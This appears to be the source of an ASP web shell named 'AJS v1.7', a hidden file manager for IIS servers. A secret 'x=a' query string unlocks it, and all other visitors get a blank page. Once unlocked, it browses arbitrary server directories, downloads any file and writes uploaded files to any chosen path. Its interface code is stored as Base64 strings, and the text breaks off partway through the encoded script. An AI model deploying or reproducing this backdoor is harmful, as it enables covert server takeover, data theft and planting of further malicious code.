<%@ LANGUAGE = VBScript.Encode %>
<%
option explicit
on error resume next

Session.Timeout=30
Server.ScriptTimeout = 7200
session.lcid=2057


'*************************  Varible  *************************
Dim FSO, Fullpath, FilePath, FolderPath, folderLocation, js, aspTitle
Dim mode

'''''' Basic Settings '''''
aspTitle = "AJS v1.7"
'''''' Basic Settings '''''

Set FSO = CreateObject("Scripting.FileSystemObject")
Fullpath=replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\")
FilePath = mid(Fullpath,InStrRev(Fullpath,"\")+1)
FolderPath = Left(Fullpath,InStrRev(Fullpath,"\"))
folderLocation = Request("location")
mode = Request("mode")

if(folderLocation = "" or folderLocation = "/" or folderLocation = "\") then
	folderLocation = addslash(FolderPath)
else
	folderLocation = addslash(folderLocation)
end if

If (LCase(Request.ServerVariables("QUERY_STRING"))="x=a") Then
	Session("allow")=1
	Session("myFolderList") = Array("noxxxinfo")
	Session("myFileList") = Array("noxxxinfo")
	Response.CacheControl = "no-cache"
	Response.Status = "301 Moved Permanently"
	Response.Expires = 0
	Response.Expiresabsolute = Now() - 1
	Response.AddHeader "pragma","no-cache"
	Response.AddHeader "cache-control","private"
	Response.AddHeader "Location", FilePath
	Response.End
End If

If (Session("allow") <> 1) Then
	Response.Expires = 0
	Response.Expiresabsolute = Now() - 1
	Response.AddHeader "pragma","no-cache"
	Response.AddHeader "cache-control","private"
	Response.CacheControl = "no-cache"
	Response.End
End If

Session("allow")=1
'*************************  Varible  *************************

'*************************  JSON.asp  *************************
class JSON

	'private members
	private output, innerCall

	'public members
	public toResponse		''[bool] should the generated representation be written directly to the response (using <em>Response.Write</em>)? default = false
	public recordsetPaging	''[bool] indicates if only the current page should be processed on paged recordsets.
							''e.g. would return only 10 records if <em>RS.pagesize</em> is set to 10. default = false (means that always all records are processed)

	public sub class_initialize()
		newGeneration()
		toResponse = false
		recordsetPaging = false
	end sub

	public function escape(val)
		dim cDoubleQuote, cRevSolidus, cSolidus
		cDoubleQuote = &h22
		cRevSolidus = &h5C
		cSolidus = &h2F
		dim i, currentDigit
		for i = 1 to (len(val))
			currentDigit = mid(val, i, 1)
			if ascw(currentDigit) > &h00 and ascw(currentDigit) < &h1F then
				currentDigit = escapequence(currentDigit)
			elseif ascw(currentDigit) >= &hC280 and ascw(currentDigit) <= &hC2BF then
				currentDigit = "\u00" + right(padLeft(hex(ascw(currentDigit) - &hC200), 2, 0), 2)
			elseif ascw(currentDigit) >= &hC380 and ascw(currentDigit) <= &hC3BF then
				currentDigit = "\u00" + right(padLeft(hex(ascw(currentDigit) - &hC2C0), 2, 0), 2)
			else
				select case ascw(currentDigit)
					case cDoubleQuote: currentDigit = escapequence(currentDigit)
					case cRevSolidus: currentDigit = escapequence(currentDigit)
					case cSolidus: currentDigit = escapequence(currentDigit)
				end select
			end if
			escape = escape & currentDigit
		next
	end function

	public default function toJSON(name, val, nested)
		if not nested and not isEmpty(name) then write("{")
		if not isEmpty(name) then write("""" & escape(name) & """: ")
		generateValue(val)
		if not nested and not isEmpty(name) then write("}")
		toJSON = output

		if innerCall = 0 then newGeneration()
	end function

	'******************************************************************************************************************
	'* generate
	'******************************************************************************************************************
	private function generateValue(val)
		if isNull(val) then
			write("null")
		elseif isArray(val) then
			generateArray(val)
		elseif isObject(val) then
			dim tName : tName = typename(val)
			if val is nothing then
				write("null")
			elseif tName = "Dictionary" or tName = "IRequestDictionary" then
				generateDictionary(val)
			elseif tName = "Recordset" then
				generateRecordset(val)
			elseif tName = "IRequest" then
				set req = server.createObject("scripting.dictionary")
				req.add "clientcertificate", val.ClientCertificate
				req.add "cookies", val.cookies
				req.add "form", val.form
				req.add "querystring", val.queryString
				req.add "servervariables", val.serverVariables
				req.add "totalbytes", val.totalBytes
				generateDictionary(req)
			elseif tName = "IStringList" then
				if val.count = 1 then
					toJSON empty, val(1), true
				else
					generateArray(val)
				end if
			else
				generateObject(val)
			end if
		else
			'bool
			dim varTyp
			varTyp = varType(val)
			if varTyp = 11 then
				if val then write("true") else write("false")
			'int, long, byte
			elseif varTyp = 2 or varTyp = 3 or varTyp = 17 or varTyp = 19 then
				write(cLng(val))
			'single, double, currency
			elseif varTyp = 4 or varTyp = 5 or varTyp = 6 or varTyp = 14 then
				write(replace(cDbl(val), ",", "."))
			else
				write("""" & escape(val & "") & """")
			end if
		end if
		generateValue = output
	end function

	'******************************************************************************************************************
	'* generateArray
	'******************************************************************************************************************
	private sub generateArray(val)
		dim item, i, stId
		write("[")
		if(val(0) <> "noxxxinfo") then
			stId = 0
		else
			stId = 1
		end if
		'the for each allows us to support also multi dimensional arrays
		for i = stId to UBound(val)
			if i > stId then write(",")
			generateValue(val(i))
		next
		write("]")
	end sub

	'******************************************************************************************************************
	'* generateDictionary
	'******************************************************************************************************************
	private sub generateDictionary(val)
		innerCall = innerCall + 1
		if val.count = 0 then
			toJSON empty, null, true
			exit sub
		end if
		dim key, i
		write("{")
		i = 0
		for each key in val
			if i > 0 then write(",")
			toJSON key, val(key), true
			i = i + 1
		next
		write("}")
		innerCall = innerCall - 1
	end sub

	'******************************************************************************************************************
	'* generateRecordset
	'******************************************************************************************************************
	private sub generateRecordset(val)
		dim i, curRow, colValue
		write("[")
		curRow = 0
		'recordset.pagesize = -1 means it is not paged.
		while not val.eof and ((recordsetPaging and curRow < val.pageSize) or val.recordCount = -1 or not recordsetPaging)
			innerCall = innerCall + 1
			redim colValue(val.fields.count - 1)
			for i = 0 to val.fields.count - 1
				if  IsNull(val.fields(i).value) then
					colValue(i) = "NULL"
				elseif (Trim(val.fields(i).value)="") then
					colValue(i) = "&nbsp;"
				else
					colValue(i) = Server.HtmlEncode(val.fields(i).value)
				end if
			next
			generateArray(colValue)
			val.movenext()
			curRow = curRow + 1
			if not val.eof and ((recordsetPaging and curRow < val.pageSize) or val.recordCount = -1 or not recordsetPaging) then write(",")
			innerCall = innerCall - 1
		wend
		write("]")
	end sub

	'******************************************************************************************************************
	'* generateRecordset
	'******************************************************************************************************************
	private sub generateRecordsetX(val)
		dim i, curRow
		write("[")
		curRow = 0
		'recordset.pagesize = -1 means it is not paged.
		while not val.eof and ((recordsetPaging and curRow < val.pageSize) or val.recordCount = -1 or not recordsetPaging)
			innerCall = innerCall + 1
			write("{")
			for i = 0 to val.fields.count - 1
				if i > 0 then write(",")
				toJSON lCase(val.fields(i).name), val.fields(i).value, true
			next
			write("}")
			val.movenext()
			curRow = curRow + 1
			if not val.eof and ((recordsetPaging and curRow < val.pageSize) or val.recordCount = -1 or not recordsetPaging) then write(",")
			innerCall = innerCall - 1
		wend
		write("]")
	end sub

	'******************************************************************************************************************
	'* generateObject
	'******************************************************************************************************************
	private sub generateObject(val)
		dim props
		on error resume next
		set props = val.reflect()
		if err = 0 then
			on error goto 0
			innerCall = innerCall + 1
			toJSON empty, props, true
			innerCall = innerCall - 1
		else
			on error goto 0
			write("""" & escape(typename(val)) & """")
		end if
	end sub

	'******************************************************************************************************************
	'* newGeneration
	'******************************************************************************************************************
	private sub newGeneration()
		output = empty
		innerCall = 0
	end sub

	'******************************************************************************************
	'* JsonEscapeSquence
	'******************************************************************************************
	private function escapequence(digit)
		escapequence = "\u00" + right(padLeft(hex(ascw(digit)), 2, 0), 2)
	end function

	'******************************************************************************************
	'* padLeft
	'******************************************************************************************
	private function padLeft(value, totalLength, paddingChar)
		padLeft = right(clone(paddingChar, totalLength) & value, totalLength)
	end function

	'******************************************************************************************
	'* clone
	'******************************************************************************************
	private function clone(byVal str, n)
		dim i
		for i = 1 to n : clone = clone & str : next
	end function

	'******************************************************************************************
	'* write
	'******************************************************************************************
	private sub write(val)
		if toResponse then
			Response.Write(val)
		else
			output = output & val
		end if
	end sub

end class
'*************************  JSON.asp  *************************


'*************************  Func.asp  *************************
function addslash(path)
    if right(path,1)="\" then addslash=path else addslash=path & "\"
end function

Function FormatSize(intSize)
	If (intSize < 1024) Then
		FormatSize = intSize & " B"
	ElseIf (intSize < 1024*1024) Then
		FormatSize = FormatNumber(intSize/1024,2) & " KB"
	ElseIf (intSize < 1024*1024*1024) Then
		FormatSize = FormatNumber(intSize/(1024*1024),2) & " MB"
	Else
		FormatSize = FormatNumber(intSize/(1024*1024*1024),2) & " GB"
	End If
End Function

Function Base64Encode(inData)
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim cOut, sOut, I

  For I = 1 To Len(inData) Step 3
    Dim nGroup, pOut, sGroup

    nGroup = &H10000 * Asc(Mid(inData, I, 1)) + _
      &H100 * MyASC(Mid(inData, I + 1, 1)) + MyASC(Mid(inData, I + 2, 1))

    nGroup = Oct(nGroup)

    nGroup = String(8 - Len(nGroup), "0") & nGroup

    pOut = Mid(Base64, CLng("&o" & Mid(nGroup, 1, 2)) + 1, 1) + _
      Mid(Base64, CLng("&o" & Mid(nGroup, 3, 2)) + 1, 1) + _
      Mid(Base64, CLng("&o" & Mid(nGroup, 5, 2)) + 1, 1) + _
      Mid(Base64, CLng("&o" & Mid(nGroup, 7, 2)) + 1, 1)

    sOut = sOut + pOut

  Next
  Select Case Len(inData) Mod 3
    Case 1: '8 bit final
      sOut = Left(sOut, Len(sOut) - 2) + "=="
    Case 2: '16 bit final
      sOut = Left(sOut, Len(sOut) - 1) + "="
  End Select
  Base64Encode = sOut
End Function

Function MyASC(OneChar)
  If OneChar = "" Then MyASC = 0 Else MyASC = Asc(OneChar)
End Function


Function Base64Decode(ByVal base64String)
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin

  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")

  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If


  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next

    nGroup = Hex(nGroup)

    nGroup = String(6 - Len(nGroup), "0") & nGroup

    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))

    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function


Function Base64ToBSTR(strBase64)
    Dim Byte1, Byte2, Byte3, Byte4
    Dim Data
    Dim iterator
    Const CharMap = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    For iterator = 0 To Len(strBase64) - 1 Step 4
        Byte1 = InStr(CharMap, Mid(strBase64, iterator + 1, 1)) - 1
        Byte2 = InStr(CharMap, Mid(strBase64, iterator + 2, 1)) - 1
        Byte3 = InStr(CharMap, Mid(strBase64, iterator + 3, 1)) - 1
        Byte4 = InStr(CharMap, Mid(strBase64, iterator + 4, 1)) - 1

        Data = Data & ChrB(Byte1 * 4 + Byte2 \ 16)

        If Byte3 >= 0 Then
            Data = Data & ChrB((Byte2 And 15) * 16 + Byte3 \ 4)
        Else
            Data = Data & ChrB((iterator * 3 \ 4 + 1) = (Byte2 And 15) * 16)
        End If

        If Byte4 >= 0 Then
            Data = Data & ChrB((Byte3 And 3) * 64 + Byte4)
        End If
    Next
    Base64ToBSTR = Data
End Function



Function ReadBinaryFile(FileName)
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile = BinaryStream.Read
End Function

' -----------------------------------------
' URL decode to retrieve the original value

Function URLDecode(sConvert)
    Dim aSplit
    Dim sOutput
    Dim I
    If IsNull(sConvert) Then
       URLDecode = ""
       Exit Function
    End If

    ' convert all pluses to spaces
    sOutput = REPLACE(sConvert, "+", " ")

    ' next convert %hexdigits to the character
    aSplit = Split(sOutput, "%")

    If IsArray(aSplit) Then
      sOutput = aSplit(0)
      For I = 0 to UBound(aSplit) - 1
        sOutput = sOutput & _
          Chr("&H" & Left(aSplit(i + 1), 2)) &_
          Right(aSplit(i + 1), Len(aSplit(i + 1)) - 2)
      Next
    End If

    URLDecode = sOutput
End Function

Private Sub DownloadFile(file)
 	    '--declare variables
 	    Dim strAbsFile
 	    Dim strFileExtension
 	    Dim objFSO
 	    Dim objFile
 	    Dim objStream
 	    '-- set absolute file location
 	    strAbsFile = file
 	    '-- create FSO object to check if file exists and get properties
 	    Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
 	    '-- check to see if the file exists
 	    If objFSO.FileExists(strAbsFile) Then
 	        Set objFile = objFSO.GetFile(strAbsFile)
 	        '-- first clear the response, and then set the appropriate headers
 	        Response.Clear
 	        '-- the filename you give it will be the one that is shown
 	        ' to the users by default when they save
 	        Response.AddHeader "Content-Disposition", "attachment; filename=" & objFile.Name
			Response.AddHeader "Content-Length", objFile.Size
 	        Response.ContentType = "application/octet-stream"
 	        Set objStream = Server.CreateObject("ADODB.Stream")
 	        objStream.Open
 	        '-- set as binary
 	        objStream.Type = 1
 	        Response.CharSet = "UTF-8"
 	        '-- load into the stream the file
 	        objStream.LoadFromFile(strAbsFile)
 	        '-- send the stream in the response
 	        Response.BinaryWrite(objStream.Read)
 	        objStream.Close
 	        Set objStream = Nothing
 	        Set objFile = Nothing
 	    Else 'objFSO.FileExists(strAbsFile)
 	        Response.Clear
 	        Response.Write("No such file exists.")
 	    End If
 	    Set objFSO = Nothing
End Sub

'*************************  Upload  *************************
Class FileUploader
	Public  Files
	Public mcolFormElem

	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub

	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub

	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property

	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound

		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))

		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub

		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)

		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))

			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)

			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile

				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))

				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))

				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))

				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)

				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If

			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub

	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function

	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1)))
		Next
	End Function
End Class

Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData

	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property

	Public Sub SaveToDisk(sPath)
		on error resume next
		Dim oFS, oFile, nIndex

		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"

		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub

		Set oFile = oFS.CreateTextFile(sPath & FileName, True)

		For nIndex = 1 to LenB(FileData)
		    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next

		oFile.Close
	End Sub

	Public Sub SaveToDatabase(ByRef oField)
		If LenB(FileData) = 0 Then Exit Sub

		If IsObject(oField) Then
			oField.AppendChunk FileData
		End If
	End Sub

End Class

function Upload(location)
	Dim Uploader, File
	Set Uploader = New FileUploader

	Uploader.Upload()

	If Uploader.Files.Count = 0 Then
		Response.Write "<TR><TD class=""kbrtm"">File(s) not uploaded.</TD></TR>"
	Else
		For Each File In Uploader.Files.Items
			File.SaveToDisk Uploader.mcolFormElem.Item("location")

			if Err.Number<>0 then
				Response.Write "<TR><TD class=""kbrtm"">File Uploaded: " & File.FileName & " : "
				Response.Write "Failed (" & Err.Description & ")</TD></TR>"
				Err.Clear
			else
				Response.Write "<TR><TD class=""kbrtm"">File Uploaded: " & Uploader.mcolFormElem.Item("location") & File.FileName & "<br>"
				Response.Write "Size: " & File.FileSize & " bytes</TD></TR>"
			end if

		Next
	End If

	Upload = Uploader.mcolFormElem.Item("linkback")
end function
'*************************  Upload  *************************

'*************************  Func.asp  *************************


'*************************  media.asp  *************************

dim script, img_loading, img_dir, img_lvUp, img_txt, img_img, img_unknow, media_style

media_style = ""&_
"Ym9keXsKCW1hcmdpbjowcHg7Cglmb250LXN0eWxlOm5vcm1hbDsKCWZvbnQtc2l6ZToxMXB4OwoJY29sb3I6I0ZGRkZGRjsKCWZvbnQtZmFtaWx5OlZlcmRhbmEsQXJpYWw7CgliYWNrZ3JvdW5kLWNvbG9yOiMzYTNhM2E7CglzY3JvbGxiYXItZmFjZS1jb2xvcjogIzMwMzAzMDsKCXNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6" &_
"ICM1ZDVkNWQ7CglzY3JvbGxiYXItc2hhZG93LWNvbG9yOiAjMTIxMjEyOwoJc2Nyb2xsYmFyLTNkbGlnaHQtY29sb3I6ICMzYTNhM2E7CglzY3JvbGxiYXItYXJyb3ctY29sb3I6ICM5ZDlkOWQ7CglzY3JvbGxiYXItdHJhY2stY29sb3I6ICMzYTNhM2E7CglzY3JvbGxiYXItZGFya3NoYWRvdy1jb2xvcjogIzNhM2EzYTsKfQoK" &_
"CnRkewoJZm9udC1zdHlsZTpub3JtYWw7Cglmb250LXNpemU6MTFweDsKCWNvbG9yOiNGRkZGRkY7Cglmb250LWZhbWlseTpWZXJkYW5hLEFyaWFsOwoJaGVpZ2h0OiAyNHB4Owp9CgphewoJY29sb3I6I0VFRUVFRTsKCXRleHQtZGVjb3JhdGlvbjpub25lOwoJZm9udC1zaXplOjEwcHg7Cglmb250LXdlaWdodDpib2xkOwoJdmVy" &_
"dGljYWwtYWxpZ246dGV4dC10b3A7Cn0KCmE6aG92ZXJ7Cgljb2xvcjojNDBhMGVjOwp9CgphOnZpc2l0ZWR7Cgljb2xvcjojRUVFRUVFOwp9CgphOnZpc2l0ZWQ6aG92ZXJ7Cgljb2xvcjojNDBhMGVjOwp9Cgp0ZXh0YXJlYXsKCWJhY2tncm91bmQ6IzEyMTIxMjsKCWNvbG9yOiNGRkZGRkY7Zm9udC1mYW1pbHk6VmVyZGFuYSxB" &_
"cmlhbDsKCWZvbnQtc2l6ZToxMXB4OwoJdmVydGljYWwtYWxpZ246bWlkZGxlOyAKCWhlaWdodDoxODsKCWJvcmRlci1sZWZ0OjFweCBzb2xpZCAjMTIxMjEyOwoJYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjNWQ1ZDVkOwoJYm9yZGVyLWJvdHRvbToxcHggc29saWQgIzVkNWQ1ZDsKCWJvcmRlci10b3A6MXB4IHNvbGlkICMxMjEy" &_
"MTI7Cn0KCmlucHV0ICxzZWxlY3R7CgliYWNrZ3JvdW5kOiMzMDMwMzA7Cgljb2xvcjojRkZGRkZGOwoJZm9udC1mYW1pbHk6VmVyZGFuYSxBcmlhbDsKCWZvbnQtc2l6ZToxMXB4OwoJdmVydGljYWwtYWxpZ246bWlkZGxlOwoJaGVpZ2h0OjI0OyAKCWJvcmRlci1sZWZ0OjFweCBzb2xpZCAjNWQ1ZDVkOwoJYm9yZGVyLXJpZ2h0" &_
"OjFweCBzb2xpZCAjMTIxMjEyOwoJYm9yZGVyLWJvdHRvbToxcHggc29saWQgIzEyMTIxMjsKCWJvcmRlci10b3A6MXB4IHNvbGlkICM1ZDVkNWQ7Cn0KCmlucHV0LnhjaGVjayB7CglkaXNwbGF5OiBibG9jazsKCWhlaWdodDogMjJweDsKCXdpZHRoOiAyMnB4OwoJcGFkZGluZzogMDsKCW1hcmdpbjogMDsKCWJvcmRlcjogMDsK" &_
"fQoKLmticnRtewoJYmFja2dyb3VuZDojMzAzMDMwOwoJY29sb3I6I0ZGRkZGRjsKCWZvbnQtZmFtaWx5OlZlcmRhbmEsQXJpYWw7Cglmb250LXNpemU6MTFweDsKCXZlcnRpY2FsLWFsaWduOm1pZGRsZTsKCWhlaWdodDoyNDsgCglib3JkZXItbGVmdDoxcHggc29saWQgIzVkNWQ1ZDsKCWJvcmRlci1yaWdodDoxcHggc29saWQg" &_
"IzEyMTIxMjsKCWJvcmRlci1ib3R0b206MXB4IHNvbGlkICMxMjEyMTI7Cglib3JkZXItdG9wOjFweCBzb2xpZCAjNWQ1ZDVkOwp9Cgoua2JydG0xewoJYmFja2dyb3VuZDojMzAzMDMwOwoJY29sb3I6I0ZGRkZGRjsKCWZvbnQtZmFtaWx5OlZlcmRhbmEsQXJpYWw7Cglmb250LXNpemU6MTFweDsKCXZlcnRpY2FsLWFsaWduOm1p" &_
"ZGRsZTsKCWhlaWdodDozMDsgCglib3JkZXItbGVmdDoxcHggc29saWQgIzVkNWQ1ZDsKCWJvcmRlci1yaWdodDoxcHggc29saWQgIzEyMTIxMjsKCWJvcmRlci1ib3R0b206MXB4IHNvbGlkICMxMjEyMTI7Cglib3JkZXItdG9wOjFweCBzb2xpZCAjNWQ1ZDVkOwp9Cgoua2JydG0xIGF7Cgljb2xvcjpvcmFuZ2U7Cgl0ZXh0LWRl" &_
"Y29yYXRpb246bm9uZTsKCWZvbnQtc2l6ZToxMXB4OwoJZm9udC13ZWlnaHQ6Ym9sZDsKCXZlcnRpY2FsLWFsaWduOnRleHQtbWlkZGxlOwp9Cgoua2JydG0xIGE6dmlzaXRlZHsKCWNvbG9yOm9yYW5nZTsKfQoKLmticnRtMSBhOmhvdmVyewoJY29sb3I6IzQwYTBlYzsKfQoKLmticnRtMSBhOnZpc2l0ZWQ6aG92ZXJ7Cgljb2xv" &_
"cjojNDBhMGVjOwp9CgouZm5hbWUgewoJd2lkdGg6NDAlOwp9CgouZnNpemUgewoJd2lkdGg6NyU7Cn0KCi5mdHlwZSB7Cgl3aWR0aDo5JTsKfQoKLmZkYXRlIHsKCXdpZHRoOjEzJTsKfQoKLmZjb21tYW5kIHsKCXdpZHRoOjclOwp9CgouZmNoZWNrIHsKCXdpZHRoOjQlOwp9CgouZmFjdGlvbiB7Cgl3aWR0aDoxOCU7Cn0KCi50" &_
"YWJsZUhlYWQgewoJYmFja2dyb3VuZC1jb2xvcjoxMjEyMTI7CgloZWlnaHQ6MjU7IAp9CgojZ2FwMHsKCWRpc3BsYXk6bm9uZTsKfQoKI292ZXJsYXl7CglkaXNwbGF5Om5vbmU7Cgl6LWluZGV4OiA4MDsKCXBvc2l0aW9uOiBhYnNvbHV0ZTsKCXRvcDogMDsKCWxlZnQ6IDA7Cgl3aWR0aDogMTAwJTsKCWhlaWdodDogMTAwJTsK" &_
"CWJhY2tncm91bmQtY29sb3I6ICMwMDA7CglvcGFjaXR5OjAuNDsKCWZpbHRlcjphbHBoYShvcGFjaXR5PTQwKTsKfQoKCiN0YmxMb2FkaW5nLCAjdGJsTWFwRHJpdmVyIHsKCWRpc3BsYXk6bm9uZTsKCXotaW5kZXg6IDkwOwoJcG9zaXRpb246Zml4ZWQ7CglfcG9zaXRpb246YWJzb2x1dGU7Cgl0b3A6NTAlOyBsZWZ0OjUwJTsK" &_
"CW1hcmdpbjotNTBweCBhdXRvIGF1dG8gLTEwMHB4OwoJX3RvcDpleHByZXNzaW9uKGRvY3VtZW50LmJvZHkuc2Nyb2xsVG9wKyhkb2N1bWVudC5ib2R5LmNsaWVudEhlaWdodC10aGlzLmNsaWVudEhlaWdodCkvMik7dGV4dC1hbGlnbjpjZW50ZXI7Cn0KCiN0YmxNZW51IHsKCXotaW5kZXg6IDcwOwoJcG9zaXRpb246Zml4ZWQ7" &_
"CglfcG9zaXRpb246YWJzb2x1dGU7Cgl0b3A6MiU7IGxlZnQ6NTAlOwoJbWFyZ2luOi01MHB4IGF1dG8gYXV0byAtMTAwcHg7CglfdG9wOmV4cHJlc3Npb24oZG9jdW1lbnQuYm9keS5zY3JvbGxUb3ArKGRvY3VtZW50LmJvZHkuY2xpZW50SGVpZ2h0LXRoaXMuY2xpZW50SGVpZ2h0KS81MCk7dGV4dC1hbGlnbjpjZW50ZXI7Cn0="

script = "" &_
"dmFyIGlzSUU9LypAY2Nfb24hQCovZmFsc2U7Ly9JRSBkZXRlY3Rvcgp2YXIgbGFzdFVybCA9ICcjRXhwbG9yZXJ8XFwnOwp2YXIgbGFzdFVybEJhY2t1cCA9ICcjRXhwbG9yZXJ8XFwnOwp2YXIgY3VycmVudF91cmwgPSAnJzsKdmFyIGN1cnJlbnRfcnVubmluZyA9IGZhbHNlOwp2YXIgZmllbGQgPSAnJzsKdmFyIGludGVydmFs" &_
"ID0gJyc7CnZhciBodHRwID0gY3JlYXRlUmVxdWVzdE9iamVjdCgpOwp2YXIgZmZMaXN0ID0gbnVsbDsKdmFyIGxzdFJlc3BvbnNlID0gbnVsbDsKdmFyIGFjdGlvblJlc3BvbnNlID0gbnVsbDsKdmFyIGV4dF90ZXh0ID0gJy50eHQuYXNwLmFzcHgucGhwLmNmbS5qcy5jb25maWcuaHRtLmh0bWwueG1sLmNzcy5pbmkuYmF0LmNt" &_
"ZC5jcy52Yi5hc3guaW5jLmFzYS5hc2F4LmFzY3gubG9nLic7CnZhciBleHRfaW1nID0gJy5qcGcuanBlLmpwZWcucG5nLmdpZi5wbmcudGlmZi5ibXAuJzsKdmFyIGltZ19sb2FkaW5nID0gbnVsbDsKdmFyIGltZ192aWV3ID0gbnVsbDsKdmFyIHNhdmVUaW1lciA9IDA7CnZhciBwb3NTUUwgPSAwOwp2YXIgcG9zRXhwID0gMDsK" &_
"dmFyIG5vRmlsZSA9IDA7CnZhciBub0ZvbGRlciA9IDA7CgpTdHJpbmcucHJvdG90eXBlLnRyaW0gPSBmdW5jdGlvbigpIHsKCXJldHVybiB0aGlzLnJlcGxhY2UoL15ccyt8XHMrJC9nLCIiKTsKfQoKU3RyaW5nLnByb3RvdHlwZS5zdGFydHNXaXRoID0gZnVuY3Rpb24oc3RyKXsKICAgIHJldHVybiAodGhpcy5pbmRleE9mKHN0" &_
"cikgPT09IDApOwp9CgpTdHJpbmcucHJvdG90eXBlLmFkZFNsYXNoID0gZnVuY3Rpb24oKXsKCXBhdGggPSB0aGlzOwoJaWYocGF0aC5sZW5ndGg8MSkgcmV0dXJuIHBhdGg7CglpZihwYXRoLnN1YnN0cmluZyhwYXRoLmxlbmd0aCAtMSkgIT0gJ1xcJykKCXsKCQlwYXRoICs9ICdcXCc7Cgl9CglyZXR1cm4gcGF0aDsKfQoKQXJy" &_
